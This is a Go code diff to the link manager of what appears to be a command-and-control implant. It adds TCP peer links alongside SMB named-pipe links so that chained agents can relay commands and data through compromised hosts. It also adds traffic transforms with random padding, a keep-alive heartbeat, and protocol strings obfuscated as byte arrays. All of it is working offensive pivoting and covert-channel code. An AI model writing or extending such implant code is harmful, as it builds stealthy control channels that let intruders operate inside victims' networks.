@@ -4,6 +4,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"net"
@@ -19,6 +20,8 @@ var (
 	lmTypeData      = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                                                                                                                                       // data
 	lmTypeDisconn   = string([]byte{0x64, 0x69, 0x73, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74})                                                                                                                                                   // disconnect
 	lmTypeHandshake = string([]byte{0x68, 0x61, 0x6e, 0x64, 0x73, 0x68, 0x61, 0x6b, 0x65})                                                                                                                                                         // handshake
+	lmTypePing      = string([]byte{0x70, 0x69, 0x6e, 0x67})                                                                                                                                                                                       // ping
+	lmTypePong      = string([]byte{0x70, 0x6f, 0x6e, 0x67})                                                                                                                                                                                       // pong
 	lmStatusActive  = string([]byte{0x61, 0x63, 0x74, 0x69, 0x76, 0x65})                                                                                                                                                                           // active
 	lmStatusInact   = string([]byte{0x69, 0x6e, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65})                                                                                                                                                               // inactive
 	lmAuthPrefix    = string([]byte{0x41, 0x55, 0x54, 0x48, 0x3a})                                                                                                                                                                                 // AUTH:
@@ -28,24 +31,36 @@ var (
 	lmTimeFmt       = string([]byte{0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35})                                                                                                                                                               // 15:04:05
 )
 
-// LinkedAgent represents a connected SMB agent (child link)
+// Heartbeat configuration
+const (
+	heartbeatInterval = 60 * time.Second // Send ping every 60 seconds
+)
+
+// LinkedAgent represents a connected SMB or TCP agent (child link)
 type LinkedAgent struct {
-	RoutingID    string    // Short routing ID (assigned by this agent)
-	PipePath     string    // Full pipe path (\\server\pipe\name)
-	Conn         net.Conn  // Active pipe connection
-	Connected    time.Time // When the link was established
-	LastSeen     time.Time // Last successful communication
-	IsActive     bool      // Whether the link is active
-	mu           sync.Mutex
+	RoutingID         string    // Short routing ID (assigned by this agent)
+	PipePath          string    // Full pipe path for SMB (\\server\pipe\name)
+	Address           string    // TCP address for TCP links (host:port)
+	LinkType          string    // "smb" or "tcp"
+	Conn              net.Conn  // Active connection (pipe or TCP)
+	Connected         time.Time // When the link was established
+	LastSeen          time.Time // Last successful communication
+	IsActive          bool      // Whether the link is active
+	AwaitingHandshake bool      // True after auth, false after first message (used for state-based routing)
+	prependLen        int       // Track random prepend length for transform reversal
+	appendLen         int       // Track random append length for transform reversal
+	mu                sync.Mutex
 }
 
-// LinkManager manages connections to linked SMB agents (child links)
+// LinkManager manages connections to linked SMB and TCP agents (child links)
 type LinkManager struct {
-	mu           sync.RWMutex
-	links        map[string]*LinkedAgent // routingID -> LinkedAgent
-	pipeToRoute  map[string]string       // pipePath -> routingID (for dedup)
-	nextID       uint32                  // Atomic counter for generating routing IDs
-	outboundData chan *LinkDataOut       // Data received from linked agents, to be sent up the chain
+	mu             sync.RWMutex
+	links          map[string]*LinkedAgent // routingID -> LinkedAgent
+	pipeToRoute    map[string]string       // pipePath -> routingID (for SMB dedup)
+	addressToRoute map[string]string       // address -> routingID (for TCP dedup)
+	nextID         uint32                  // Atomic counter for generating routing IDs
+	outboundData   chan *LinkDataOut       // Data received from linked agents, to be sent up the chain
+	handshakeData  chan *LinkDataOut       // Handshake data from new linked agents (sent via "lh" field)
 
 	// Response channels for synchronous command/response patterns
 	responseChannels map[string]chan *LinkDataOut // routingID -> response channel
@@ -57,8 +72,10 @@ type LinkManager struct {
 
 // LinkDataOut represents data from a linked agent to be forwarded up the chain
 type LinkDataOut struct {
-	RoutingID string `json:"r"` // Routing ID
-	Payload   string `json:"p"` // Base64 encoded, encrypted payload
+	RoutingID     string `json:"r"`            // Routing ID
+	Payload       string `json:"p"`            // Base64 encoded, encrypted payload (or opaque transformed blob)
+	PrependLength int    `json:"pl,omitempty"` // Random prepend length for transform reversal
+	AppendLength  int    `json:"al,omitempty"` // Random append length for transform reversal
 }
 
 // LinkDataIn represents data from the server destined for a linked agent
@@ -78,10 +95,14 @@ func GetLinkManager() *LinkManager {
 		smbLinkManager = &LinkManager{
 			links:               make(map[string]*LinkedAgent),
 			pipeToRoute:         make(map[string]string),
+			addressToRoute:      make(map[string]string),
 			outboundData:        make(chan *LinkDataOut, 100),
+			handshakeData:       make(chan *LinkDataOut, 10),
 			responseChannels:    make(map[string]chan *LinkDataOut),
 			unlinkNotifications: make(chan string, 100),
 		}
+		// Start the heartbeat goroutine to keep links alive
+		smbLinkManager.StartHeartbeat()
 	})
 	return smbLinkManager
 }
@@ -121,12 +142,14 @@ func (lm *LinkManager) Link(pipePath string) (string, error) {
 
 	// Create linked agent entry
 	link := &LinkedAgent{
-		RoutingID: routingID,
-		PipePath:  pipePath,
-		Conn:      conn,
-		Connected: time.Now(),
-		LastSeen:  time.Now(),
-		IsActive:  true,
+		RoutingID:         routingID,
+		PipePath:          pipePath,
+		LinkType:          "smb",
+		Conn:              conn,
+		Connected:         time.Now(),
+		LastSeen:          time.Now(),
+		IsActive:          true,
+		AwaitingHandshake: true, // First message after auth is always handshake
 	}
 
 	// Store the link
@@ -139,7 +162,56 @@ func (lm *LinkManager) Link(pipePath string) (string, error) {
 	return routingID, nil
 }
 
-// Unlink disconnects from an SMB agent
+// LinkTCP establishes a connection to a TCP agent
+func (lm *LinkManager) LinkTCP(address string) (string, error) {
+	lm.mu.Lock()
+	defer lm.mu.Unlock()
+
+	// Check if already linked to this address
+	if existingRoute, exists := lm.addressToRoute[address]; exists {
+		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
+			return "", fmt.Errorf(Err(E5))
+		}
+	}
+
+	// Connect via TCP
+	conn, err := dialTCP(address, 30*time.Second)
+	if err != nil {
+		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
+	}
+
+	// Perform HMAC-based authentication with the TCP agent
+	if err := performLinkAuthTCP(conn); err != nil {
+		conn.Close()
+		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
+	}
+
+	// Generate routing ID
+	routingID := lm.GenerateRoutingID()
+
+	// Create linked agent entry
+	link := &LinkedAgent{
+		RoutingID:         routingID,
+		Address:           address,
+		LinkType:          "tcp",
+		Conn:              conn,
+		Connected:         time.Now(),
+		LastSeen:          time.Now(),
+		IsActive:          true,
+		AwaitingHandshake: true, // First message after auth is always handshake
+	}
+
+	// Store the link
+	lm.links[routingID] = link
+	lm.addressToRoute[address] = routingID
+
+	// Start goroutine to handle incoming data from the TCP agent
+	go lm.handleIncomingData(link)
+
+	return routingID, nil
+}
+
+// Unlink disconnects from an SMB or TCP agent
 func (lm *LinkManager) Unlink(routingID string) error {
 	lm.mu.Lock()
 	defer lm.mu.Unlock()
@@ -167,8 +239,12 @@ func (lm *LinkManager) Unlink(routingID string) error {
 	default:
 	}
 
-	// Remove from maps
-	delete(lm.pipeToRoute, link.PipePath)
+	// Remove from maps based on link type
+	if link.LinkType == "tcp" {
+		delete(lm.addressToRoute, link.Address)
+	} else {
+		delete(lm.pipeToRoute, link.PipePath)
+	}
 	delete(lm.links, routingID)
 
 	return nil
@@ -201,7 +277,7 @@ func (lm *LinkManager) GetActiveLinks() []*LinkedAgent {
 }
 
 // ForwardToLinkedAgent sends data from parent to a linked (child) agent
-func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) error {
+func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string, transformed bool) error {
 	link, exists := lm.GetLink(routingID)
 	if !exists {
 		return fmt.Errorf(Err(E4))
@@ -214,15 +290,27 @@ func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) er
 		return fmt.Errorf(Err(E4))
 	}
 
-	// Send the payload over the pipe
-	message := map[string]string{
-		lmKeyType:    lmTypeData,
-		lmKeyPayload: payload,
-	}
+	var data []byte
+	var err error
 
-	data, err := json.Marshal(message)
-	if err != nil {
-		return fmt.Errorf(ErrCtx(E18, err.Error()))
+	if transformed {
+		// Payload has transforms applied by server - decode and send raw bytes
+		// The child agent will receive raw bytes, reverse transforms, parse JSON, decrypt
+		data, err = base64.StdEncoding.DecodeString(payload)
+		if err != nil {
+			return fmt.Errorf(ErrCtx(E18, err.Error()))
+		}
+	} else {
+		// Legacy mode - wrap payload in JSON envelope
+		message := map[string]string{
+			lmKeyType:    lmTypeData,
+			lmKeyPayload: payload,
+		}
+
+		data, err = json.Marshal(message)
+		if err != nil {
+			return fmt.Errorf(ErrCtx(E18, err.Error()))
+		}
 	}
 
 	// Write length-prefixed message
@@ -237,7 +325,8 @@ func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) er
 
 // ForwardToLinkedAgentAndWait sends data to a linked agent and waits for a response
 // Returns the response payload or error if timeout occurs
-func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload string, timeout time.Duration) (*LinkDataOut, error) {
+// If transformed=true, the payload is base64-encoded transformed data that should be sent as raw bytes
+func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload string, transformed bool, timeout time.Duration) (*LinkDataOut, error) {
 	// Create a response channel for this routing ID
 	respChan := make(chan *LinkDataOut, 1)
 
@@ -253,7 +342,7 @@ func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload str
 	}()
 
 	// Forward the command
-	if err := lm.ForwardToLinkedAgent(routingID, payload); err != nil {
+	if err := lm.ForwardToLinkedAgent(routingID, payload, transformed); err != nil {
 		return nil, err
 	}
 
@@ -307,6 +396,24 @@ func (lm *LinkManager) GetOutboundData() []*LinkDataOut {
 	}
 }
 
+// GetHandshakeData returns handshake data from newly linked child agents (sent via "lh" field)
+func (lm *LinkManager) GetHandshakeData() *LinkDataOut {
+	select {
+	case item := <-lm.handshakeData:
+		return item
+	default:
+		return nil
+	}
+}
+
+// queueHandshakeData is a helper to queue handshake data for delivery to parent
+func (lm *LinkManager) queueHandshakeData(outbound *LinkDataOut) {
+	select {
+	case lm.handshakeData <- outbound:
+	default:
+	}
+}
+
 // GetUnlinkNotifications returns routing IDs that have been unlinked and need to be reported up the chain
 func (lm *LinkManager) GetUnlinkNotifications() []string {
 	var notifications []string
@@ -323,6 +430,7 @@ func (lm *LinkManager) GetUnlinkNotifications() []string {
 }
 
 // handleIncomingData reads data from a linked agent and queues it for the parent
+// Supports both legacy JSON format and transformed/opaque data blobs
 func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
 	defer func() {
 		link.mu.Lock()
@@ -331,64 +439,100 @@ func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
 	}()
 
 	for {
-		// Read length-prefixed message from pipe
+		// Read length-prefixed message from pipe/socket
 		data, err := readMessage(link.Conn)
 		if err != nil {
 			return
 		}
 
-		// Parse the message
+		// Try to parse as legacy JSON format first
 		var message map[string]string
-		if err := json.Unmarshal(data, &message); err != nil {
-			continue
-		}
+		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType] != "" {
+			// Successfully parsed as JSON with type field - legacy format
+			msgType := message[lmKeyType]
 
-		switch message[lmKeyType] {
-		case lmTypeData:
-			// Build outbound data
-			outbound := &LinkDataOut{
-				RoutingID: link.RoutingID,
-				Payload:   message[lmKeyPayload],
-			}
-
-			// Check if someone is waiting synchronously for this response
-			lm.responseMu.RLock()
-			respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
-			lm.responseMu.RUnlock()
-
-			if hasSyncWaiter {
-				// Send to synchronous waiter (non-blocking)
-				select {
-				case respChan <- outbound:
-				default:
-					// Channel full or closed, fall back to async queue
-					lm.queueOutboundData(outbound)
+			switch msgType {
+			case lmTypeData:
+				outbound := &LinkDataOut{
+					RoutingID: link.RoutingID,
+					Payload:   message[lmKeyPayload],
 				}
-			} else {
-				// No synchronous waiter, queue for normal async processing
-				lm.queueOutboundData(outbound)
-			}
+				lm.deliverOutbound(link, outbound)
 
-		case lmTypeHandshake:
-			// Initial handshake from SMB agent - queue for parent to forward up the chain
+				// Clear handshake state after first data message
+				link.mu.Lock()
+				link.AwaitingHandshake = false
+				link.mu.Unlock()
+
+			case lmTypeHandshake:
+				outbound := &LinkDataOut{
+					RoutingID: link.RoutingID,
+					Payload:   message[lmKeyPayload],
+				}
+				lm.queueHandshakeData(outbound)
+
+				// Clear handshake state
+				link.mu.Lock()
+				link.AwaitingHandshake = false
+				link.mu.Unlock()
+
+			case lmTypePong:
+				// Heartbeat response - just update LastSeen
+
+			case lmTypeDisconn:
+				return
+			}
+		} else {
+			// Not valid JSON or no type field - treat as raw transformed data
+			// Child agent sent pre-transformed blob, base64 encode and forward as opaque
+			link.mu.Lock()
+			isHandshake := link.AwaitingHandshake
+			prependLen := link.prependLen
+			appendLen := link.appendLen
+			link.AwaitingHandshake = false // First message consumed
+			link.mu.Unlock()
+
+			// Base64 encode the raw transformed data for transport
 			outbound := &LinkDataOut{
-				RoutingID: link.RoutingID,
-				Payload:   message[lmKeyPayload],
-			}
-			select {
-			case lm.outboundData <- outbound:
-			default:
+				RoutingID:     link.RoutingID,
+				Payload:       base64.StdEncoding.EncodeToString(data),
+				PrependLength: prependLen,
+				AppendLength:  appendLen,
 			}
 
-		case lmTypeDisconn:
-			return
-
-		default:
+			if isHandshake {
+				// First message after auth = handshake
+				lm.queueHandshakeData(outbound)
+			} else {
+				// Subsequent messages = data
+				lm.deliverOutbound(link, outbound)
+			}
 		}
 
 		link.mu.Lock()
 		link.LastSeen = time.Now()
 		link.mu.Unlock()
+	}
+}
+
+// deliverOutbound delivers data to synchronous waiter or queues for async processing
+func (lm *LinkManager) deliverOutbound(link *LinkedAgent, outbound *LinkDataOut) {
+	// Check if someone is waiting synchronously for this response
+	lm.responseMu.RLock()
+	respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
+	lm.responseMu.RUnlock()
+
+	if hasSyncWaiter {
+		// Send to synchronous waiter (non-blocking)
+		select {
+		case respChan <- outbound:
+		default:
+			// Channel full or closed, fall back to async queue
+			lm.queueOutboundData(outbound)
+		}
+	} else {
+		// No synchronous waiter, queue for normal async processing
+		lm.queueOutboundData(outbound)
 	}
 }
 
@@ -415,8 +559,13 @@ func (lm *LinkManager) ListLinks() string {
 		if !link.IsActive {
 			status = lmStatusInact
 		}
+		// Show PipePath for SMB links, Address for TCP links
+		target := link.PipePath
+		if link.LinkType == "tcp" {
+			target = link.Address
+		}
 		result += fmt.Sprintf(lmFmtLinkRow,
-			routingID, link.PipePath, status,
+			routingID, target, status,
 			link.Connected.Format(lmTimeFmt),
 			link.LastSeen.Format(lmTimeFmt))
 	}
@@ -528,4 +677,60 @@ func readMessage(conn net.Conn) ([]byte, error) {
 	}
 
 	return data, nil
+}
+
+// StartHeartbeat starts the heartbeat goroutine that pings all active links periodically
+func (lm *LinkManager) StartHeartbeat() {
+	go func() {
+		ticker := time.NewTicker(heartbeatInterval)
+		defer ticker.Stop()
+
+		for range ticker.C {
+			lm.pingAllLinks()
+		}
+	}()
+}
+
+// pingAllLinks sends ping messages to all active links to keep connections alive
+func (lm *LinkManager) pingAllLinks() {
+	lm.mu.RLock()
+	activeLinks := make([]*LinkedAgent, 0, len(lm.links))
+	for _, link := range lm.links {
+		if link.IsActive {
+			activeLinks = append(activeLinks, link)
+		}
+	}
+	lm.mu.RUnlock()
+
+	for _, link := range activeLinks {
+		lm.sendPing(link)
+	}
+}
+
+// sendPing sends a ping message to a linked agent
+func (lm *LinkManager) sendPing(link *LinkedAgent) {
+	link.mu.Lock()
+	defer link.mu.Unlock()
+
+	if link.Conn == nil || !link.IsActive {
+		return
+	}
+
+	message := map[string]string{
+		lmKeyType: lmTypePing,
+	}
+
+	data, err := json.Marshal(message)
+	if err != nil {
+		return
+	}
+
+	// Set a short write deadline for the ping
+	link.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+	if err := writeMessage(link.Conn, data); err != nil {
+		// Mark link as inactive if ping fails
+		link.IsActive = false
+		return
+	}
+	link.Conn.SetWriteDeadline(time.Time{}) // Clear deadline
 }
